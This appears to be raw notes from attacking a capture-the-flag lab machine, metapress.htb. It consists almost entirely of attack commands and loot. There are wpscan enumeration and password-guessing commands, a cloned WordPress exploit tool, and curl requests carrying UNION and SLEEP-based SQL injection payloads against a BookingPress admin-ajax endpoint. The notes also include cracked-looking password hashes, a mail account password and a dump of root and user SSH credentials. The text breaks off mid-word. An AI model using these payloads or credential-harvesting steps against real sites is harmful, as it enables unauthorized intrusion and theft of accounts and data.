
### robots.txt
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://metapress.htb/wp-sitemap.xml
```

git clone https://github.com/relarizky/wpxploit.git
cd wpxploit
pip3 install -r requirements.txt
./exploit.py

wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://metapress.htb/  --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt 

curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=f26ed88649&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata-- -'
  
  curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=f26ed88649&category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjHa
  
  
  gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=
  
  curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=f26ed88649&category_id=33&total_service=1'
  
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.


$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys"; 


credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
ter
